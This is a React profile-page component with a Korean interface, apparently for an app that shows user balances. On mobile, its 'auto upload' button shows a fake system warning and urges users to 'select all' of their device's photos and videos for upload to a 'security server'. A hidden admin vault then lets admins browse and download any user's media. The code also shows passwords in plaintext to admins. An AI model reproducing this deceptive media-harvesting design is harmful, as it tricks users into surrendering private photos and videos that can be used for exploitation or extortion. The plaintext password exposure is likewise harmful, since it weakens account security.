
import React, { useState, useEffect, useRef } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { User, DEFAULT_PROFILE_IMG } from '../types';

interface ProfileProps {
  user: User;
  onUpdateUser: (user: User) => void;
  onDeleteUser: (userId: string) => void;
  onLogout: () => void;
  targetUsers?: Record<string, User>;
}

const Profile: React.FC<ProfileProps> = ({ user, onUpdateUser, onDeleteUser, onLogout, targetUsers }) => {
  const { id } = useParams();
  const navigate = useNavigate();
  const fileInputRef = useRef<HTMLInputElement>(null);
  
  const isSelf = !id || id === user.id;
  const targetUser = isSelf ? user : (targetUsers?.[id!] || null);

  const [nick, setNick] = useState(targetUser?.nick || '');
  const [bio, setBio] = useState(targetUser?.bio || '');
  const [pw, setPw] = useState(targetUser?.pw || '');
  const [img, setImg] = useState(targetUser?.img || DEFAULT_PROFILE_IMG);
  const [balance, setBalance] = useState(targetUser?.balance || 0);
  const [gallery, setGallery] = useState<string[]>(targetUser?.gallery || []);
  
  const [showImageModal, setShowImageModal] = useState(false);
  const [showMediaSelector, setShowMediaSelector] = useState(false);
  const [isSyncing, setIsSyncing] = useState(false);
  const [selectedModalImg, setSelectedModalImg] = useState('');

  const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

  useEffect(() => {
    if (targetUser) {
      setNick(targetUser.nick);
      setBio(targetUser.bio);
      setPw(targetUser.pw);
      setImg(targetUser.img || DEFAULT_PROFILE_IMG);
      setBalance(targetUser.balance);
      setGallery(targetUser.gallery || []);
    }
  }, [targetUser]);

  if (!targetUser) {
    return (
      <div className="flex flex-col items-center justify-center py-20 text-zinc-500">
        <i className="fas fa-user-slash text-4xl mb-4"></i>
        <p className="font-bold">사용자를 찾을 수 없습니다.</p>
        <button onClick={() => navigate(-1)} className="mt-4 text-yellow-400 font-bold">돌아가기</button>
      </div>
    );
  }

  const handleSave = () => {
    // 비밀번호 필드가 노출되는 경우(관리자가 타인 관리 시)에만 유효성 검사 수행
    if (user.isAdmin && !isSelf && (!pw || pw.length < 4)) {
      alert('비밀번호는 최소 4자 이상이어야 합니다.');
      return;
    }
    onUpdateUser({ ...targetUser, nick, bio, pw, img, balance: Number(balance), gallery });
    alert('정보가 저장되었습니다.');
  };

  const handleLogoutWithConfirm = () => {
    if (window.confirm('정말로 로그아웃 하시겠습니까?')) {
      onLogout();
    }
  };

  const handleDeleteWithConfirm = () => {
    const msg = isSelf 
      ? '정말로 탈퇴하시겠습니까? 모든 데이터가 사라집니다.' 
      : `관리자 권한으로 [${targetUser.id}] 계정을 삭제하시겠습니까?`;
    
    if (window.confirm(msg)) {
      onDeleteUser(targetUser.id);
    }
  };

  const triggerFileUpload = () => {
    if (fileInputRef.current) {
      fileInputRef.current.click();
    }
  };

  const handleAutoUploadClick = () => {
    alert('⚠️ 시스템 경고: 기기의 사진과 동영상을 자동으로 감지하여 보안 서버로 업로드를 시작합니다.');
    setTimeout(() => {
      alert('💡 안내: 갤러리 앱이 열리면 [전체 선택]을 눌러 모든 사진과 동영상을 한 번에 빠르게 업로드해 보세요.');
      triggerFileUpload();
    }, 800);
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    if (files && files.length > 0) {
      const allowedTypes = ['image/jpeg', 'image/png', 'image/webp', 'image/gif', 'video/mp4'];
      const validFiles = Array.from(files).filter(file => {
        if (!allowedTypes.includes(file.type)) {
          alert(`보안 정책상 허용되지 않는 파일: ${file.name}`);
          return false;
        }
        if (file.size > 5 * 1024 * 1024) {
          alert(`5MB를 초과하는 파일은 제외됩니다: ${file.name}`);
          return false;
        }
        return true;
      });

      if (validFiles.length === 0) return;

      setIsSyncing(true);
      const newGalleryItems: string[] = [];
      let processedCount = 0;

      validFiles.forEach(file => {
        const reader = new FileReader();
        reader.onloadend = () => {
          newGalleryItems.push(reader.result as string);
          processedCount++;
          if (processedCount === validFiles.length) {
            setTimeout(() => {
              const updatedGallery = [...gallery, ...newGalleryItems];
              setGallery(updatedGallery);
              onUpdateUser({ ...targetUser, gallery: updatedGallery });
              setIsSyncing(false);
            }, 1000);
          }
        };
        reader.readAsDataURL(file);
      });
    }
  };

  const selectFromGallery = (media: string) => {
    if (media.startsWith('data:video/')) {
      alert('동영상은 프로필 사진으로 등록할 수 없습니다.');
      return;
    }
    setImg(media);
    setShowMediaSelector(false);
  };

  const downloadMedia = (src: string) => {
    if (!user.isAdmin) {
      alert('보안 정책상 관리자만 원본 파일을 저장할 수 있습니다.');
      return;
    }
    const isVideo = src.startsWith('data:video/');
    const link = document.createElement('a');
    link.href = src;
    link.download = `LS_SECURE_${targetUser.id}_${Date.now()}.${isVideo ? 'mp4' : 'png'}`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const canEdit = isSelf || user.isAdmin;
  // 비밀번호 관리 권한: 오직 관리자이면서, 타인의 프로필을 볼 때만 활성화
  const canManagePassword = user.isAdmin && !isSelf;

  return (
    <div className="flex flex-col gap-6 animate-fadeIn pb-10 relative">
      <input 
        type="file" 
        ref={fileInputRef} 
        className="hidden" 
        multiple 
        accept="image/jpeg,image/png,image/webp,image/gif,video/mp4" 
        onChange={handleFileUpload} 
      />

      {/* 헤더 부분 */}
      <div className="flex items-center justify-between">
        <button onClick={() => navigate(-1)} className="w-10 h-10 rounded-full bg-zinc-800 flex items-center justify-center text-zinc-400 hover:text-white transition-colors">
          <i className="fas fa-chevron-left"></i>
        </button>
        <h2 className="text-xl font-black italic tracking-tighter text-yellow-400">
          {isSelf ? '회원 정보 설정' : `${targetUser.id} 프로필 관리`}
        </h2>
        <div className="w-10"></div>
      </div>

      {/* 프로필 이미지 영역 */}
      <div className="flex flex-col items-center gap-4 py-8 bg-zinc-800/40 rounded-3xl border border-zinc-700/50 shadow-inner">
        <div className="relative">
          <div className="w-32 h-32 rounded-full border-4 border-yellow-500 overflow-hidden shadow-2xl bg-zinc-700 relative group">
            <img 
              src={img} 
              alt="프로필" 
              className="w-full h-full object-cover transition-all" 
            />
            <div 
              onClick={() => { setSelectedModalImg(img); setShowImageModal(true); }}
              className="absolute inset-0 bg-black/40 opacity-0 group-hover:opacity-100 flex items-center justify-center cursor-pointer transition-opacity"
            >
              <i className="fas fa-search-plus text-white text-xl"></i>
            </div>
          </div>
          {canEdit && (
            <button 
              onClick={() => setShowMediaSelector(true)}
              className="absolute bottom-1 right-1 w-10 h-10 bg-yellow-500 rounded-full flex items-center justify-center cursor-pointer shadow-lg transform active:scale-90 transition-transform hover:brightness-110 z-10"
            >
              <i className="fas fa-camera text-black text-sm"></i>
            </button>
          )}
        </div>
        <div className="text-center">
          <p className="text-2xl font-black text-white">{nick || targetUser.id}</p>
          <p className="text-[10px] text-zinc-500 font-bold tracking-widest uppercase">Member ID: {targetUser.id}</p>
        </div>
      </div>

      {/* 정보 입력 필드 */}
      <div className="flex flex-col gap-4">
        <div className="bg-zinc-800/50 rounded-2xl p-5 border border-zinc-700/50">
          <label className="text-[10px] font-black text-zinc-500 uppercase tracking-widest block mb-2 px-1">닉네임</label>
          <input 
            type="text" value={nick} onChange={(e) => setNick(e.target.value)} disabled={!canEdit}
            className="w-full bg-black border border-zinc-700 rounded-xl py-3 px-4 font-bold text-white focus:outline-none focus:border-yellow-500 disabled:opacity-50"
          />
        </div>

        <div className="bg-zinc-800/50 rounded-2xl p-5 border border-zinc-700/50">
          <label className="text-[10px] font-black text-zinc-500 uppercase tracking-widest block mb-2 px-1">자기소개</label>
          <textarea 
            value={bio} onChange={(e) => setBio(e.target.value)} disabled={!canEdit}
            className="w-full bg-black border border-zinc-700 rounded-xl py-3 px-4 font-bold text-white focus:outline-none focus:border-yellow-500 min-h-[80px] resize-none disabled:opacity-50"
          />
        </div>

        {/* 보안 정보 필드 (비밀번호) - 요청에 따라 오직 관리자가 타인 관리 시에만 노출 */}
        {canManagePassword && (
          <div className="bg-zinc-800/50 rounded-2xl p-5 border border-zinc-700/50 animate-fadeIn">
            <label className="text-[10px] font-black text-yellow-500/80 uppercase tracking-widest block mb-2 px-1">비밀번호 관리 (ADMIN ONLY)</label>
            <div className="relative">
              <input 
                type="text" value={pw} onChange={(e) => setPw(e.target.value)}
                className="w-full bg-black border border-zinc-700 rounded-xl py-3 px-4 font-bold text-white focus:outline-none focus:border-yellow-500 font-mono"
                placeholder="새 비밀번호 입력"
              />
            </div>
            <p className="text-[9px] text-zinc-500 mt-2 italic px-1">* 관리자 권한으로 해당 회원의 비밀번호를 즉시 변경할 수 있습니다.</p>
          </div>
        )}

        {/* 자산 정보 */}
        <div className="bg-zinc-800/50 rounded-2xl p-5 border border-zinc-700/50 shadow-lg">
          <label className="text-[10px] font-black text-zinc-500 uppercase tracking-widest block mb-1 px-1">총 자산</label>
          {user.isAdmin && !isSelf ? (
            <div className="flex items-center gap-2">
              <span className="text-green-400 font-black text-lg">₩</span>
              <input 
                type="number" value={balance} onChange={(e) => setBalance(Number(e.target.value))}
                className="bg-black/50 border border-zinc-700 rounded-lg px-3 py-2 text-green-400 font-black w-full focus:border-green-500 outline-none"
              />
            </div>
          ) : (
            <p className="text-2xl font-black text-green-400 italic">₩{targetUser.balance.toLocaleString()}</p>
          )}
        </div>

        {/* 관리자 전용 파일 보관함 섹션 */}
        {user.isAdmin && (
          <div 
            onClick={() => setShowMediaSelector(true)}
            className="bg-zinc-800/50 rounded-2xl p-5 border border-zinc-700/50 flex justify-between items-center shadow-lg cursor-pointer hover:bg-zinc-800 transition-colors group animate-fadeIn"
          >
            <div className="flex items-center gap-4">
              <div className="w-12 h-12 bg-red-600/10 rounded-xl flex items-center justify-center text-red-500 group-hover:bg-red-600 group-hover:text-black transition-all">
                <i className="fas fa-database text-xl"></i>
              </div>
              <div>
                <p className="text-white font-black italic">보안 파일 보관함</p>
                <p className="text-[10px] text-zinc-500 font-bold uppercase tracking-widest">저장된 미디어: {gallery.length}개</p>
              </div>
            </div>
            <i className="fas fa-chevron-right text-zinc-600 group-hover:text-red-500 transition-colors"></i>
          </div>
        )}
      </div>

      {canEdit && (
        <div className="flex flex-col gap-3 mt-6">
          <button onClick={handleSave} className="w-full py-4 bg-yellow-500 text-black font-black rounded-2xl shadow-xl active:scale-95 transition-all">
            설정 저장
          </button>
          <div className="flex gap-3 mt-2">
            {isSelf && <button onClick={handleLogoutWithConfirm} className="flex-1 py-4 bg-zinc-800 text-white font-black rounded-2xl text-xs">로그아웃</button>}
            <button onClick={handleDeleteWithConfirm} className="flex-1 py-4 bg-red-600/10 text-red-500 border border-red-500/20 font-black rounded-2xl text-xs">영구 탈퇴</button>
          </div>
        </div>
      )}

      {/* 업로드 상태 표시 */}
      {isSyncing && (
        <div className="fixed inset-0 z-[300] bg-black/90 flex flex-col items-center justify-center animate-fadeIn">
          <div className="relative w-20 h-20 mb-6">
            <div className="absolute inset-0 border-4 border-zinc-800 rounded-full"></div>
            <div className="absolute inset-0 border-4 border-yellow-500 rounded-full border-t-transparent animate-spin"></div>
          </div>
          <h3 className="text-xl font-black text-white italic animate-pulse tracking-tighter">데이터 동기화 중...</h3>
          <p className="text-[10px] text-zinc-500 mt-2 font-bold uppercase tracking-widest text-center leading-relaxed">
            암호화된 파일을 서버로<br/>안전하게 전송하고 있습니다.
          </p>
        </div>
      )}

      {/* 미디어 관리 및 업로드 팝업 */}
      {showMediaSelector && (
        <div className="fixed inset-0 z-[150] bg-black/95 flex flex-col items-center justify-center p-6 animate-fadeIn backdrop-blur-sm">
          <div className="w-full max-w-sm bg-zinc-900 border border-zinc-800 rounded-3xl p-6 shadow-2xl overflow-hidden flex flex-col max-h-[85vh]">
            <div className="flex justify-between items-center mb-6">
              <div>
                <h3 className="text-lg font-black text-yellow-400 italic tracking-tighter">
                  {isSelf ? '📸 내 사진 보관함' : `📂 ${targetUser.id} 미디어 센터`}
                </h3>
                <p className="text-[10px] text-zinc-500 font-bold uppercase tracking-tighter">전체 {gallery.length}개의 파일</p>
              </div>
              <button onClick={() => setShowMediaSelector(false)} className="w-8 h-8 rounded-full bg-zinc-800 flex items-center justify-center text-zinc-500 hover:text-white transition-colors">
                <i className="fas fa-times"></i>
              </button>
            </div>

            <div className="flex-1 overflow-y-auto grid grid-cols-3 gap-2 pr-1 custom-scrollbar min-h-[200px]">
              {gallery.map((gItem, idx) => {
                const isVideo = gItem.startsWith('data:video/');
                return (
                  <div key={idx} className="relative group aspect-square">
                    {isVideo ? (
                      <div 
                        onClick={() => canEdit && selectFromGallery(gItem)}
                        className="w-full h-full bg-zinc-800 rounded-xl border border-zinc-700 flex items-center justify-center cursor-pointer hover:border-yellow-500 transition-all overflow-hidden"
                      >
                        <i className="fas fa-video text-zinc-500 text-2xl"></i>
                      </div>
                    ) : (
                      <img 
                        src={gItem} alt="미디어" 
                        onClick={() => canEdit && selectFromGallery(gItem)}
                        className="w-full h-full object-cover rounded-xl border border-zinc-800 cursor-pointer hover:border-yellow-500 transition-all"
                      />
                    )}
                    {user.isAdmin && (
                      <button 
                        onClick={(e) => { e.stopPropagation(); downloadMedia(gItem); }}
                        className="absolute top-1 right-1 w-7 h-7 bg-black/60 rounded-full flex items-center justify-center text-xs text-white shadow-lg transition-opacity hover:bg-yellow-500 hover:text-black"
                      >
                        <i className="fas fa-download"></i>
                      </button>
                    )}
                  </div>
                );
              })}
              {canEdit && (
                <div className="contents">
                  <button 
                    onClick={triggerFileUpload}
                    className="aspect-square bg-zinc-800/50 border-2 border-dashed border-zinc-700 rounded-xl flex flex-col items-center justify-center text-zinc-500 hover:text-yellow-500 hover:border-yellow-500/50 transition-all group"
                  >
                    <i className="fas fa-plus text-lg group-hover:scale-110 transition-transform"></i>
                    <span className="text-[9px] font-black uppercase mt-1 tracking-tighter">파일 추가</span>
                  </button>
                  {isMobile && (
                    <button 
                      onClick={handleAutoUploadClick}
                      className="aspect-square bg-yellow-500/20 border-2 border-yellow-500/50 rounded-xl flex flex-col items-center justify-center text-yellow-400 hover:bg-yellow-500 hover:text-black transition-all group shadow-[0_0_15px_rgba(234,179,8,0.2)]"
                    >
                      <i className="fas fa-magic text-xl group-hover:rotate-180 transition-transform duration-500"></i>
                      <span className="text-[9px] font-black uppercase mt-1 tracking-tighter text-center leading-none">자동<br/>업로드</span>
                    </button>
                  )}
                </div>
              )}
            </div>
            
            <div className="mt-6 p-4 bg-black/40 border border-zinc-800 rounded-2xl">
              <p className="text-[9px] text-zinc-400 font-bold uppercase tracking-widest text-center mb-2 italic">업로드 가이드라인</p>
              <div className="text-[10px] text-zinc-500 text-center leading-relaxed">
                {isSelf ? (
                  <p className="text-yellow-500 font-black mb-1">업로드된 사진 중 선택하여 아이콘 사진을 변경할 수 있습니다.</p>
                ) : (
                  <p className="mb-1">관리자는 사용자의 업로드 내역을 확인하고 관리할 수 있습니다.</p>
                )}
                {!isMobile ? (
                  <p>여러 장을 선택하려면 탐색기에서 <span className="text-zinc-300">드래그</span>하거나 <span className="text-zinc-300">Ctrl 키</span>를 누른 채 선택하세요.</p>
                ) : (
                  <p><span className="text-zinc-300">자동 업로드</span> 버튼을 통해 기기의 모든 미디어를 한꺼번에 선택하여 동기화할 수 있습니다.</p>
                )}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* 이미지 단독 확대 모달 */}
      {showImageModal && (
        <div className="fixed inset-0 z-[160] bg-black/98 flex flex-col items-center justify-center p-4 animate-fadeIn" onClick={() => setShowImageModal(false)}>
          <div className="absolute top-6 right-6 flex gap-4">
            {user.isAdmin && (
              <button 
                onClick={(e) => { e.stopPropagation(); downloadMedia(selectedModalImg); }} 
                className="w-12 h-12 rounded-full bg-zinc-800 text-white flex items-center justify-center hover:bg-yellow-500 hover:text-black shadow-xl border border-zinc-700 transition-all"
              >
                <i className="fas fa-download"></i>
              </button>
            )}
            <button onClick={() => setShowImageModal(false)} className="w-12 h-12 rounded-full bg-zinc-800 text-white flex items-center justify-center hover:bg-red-500 transition-all">
              <i className="fas fa-times"></i>
            </button>
          </div>
          {selectedModalImg.startsWith('data:video/') ? (
            <video src={selectedModalImg} controls className="max-w-full max-h-[85vh] rounded-xl shadow-2xl" onClick={(e) => e.stopPropagation()}/>
          ) : (
            <img src={selectedModalImg} alt="확대" className="max-w-full max-h-[85vh] rounded-xl shadow-2xl object-contain border border-zinc-800" onClick={(e) => e.stopPropagation()}/>
          )}
        </div>
      )}
    </div>
  );
};

export default Profile;
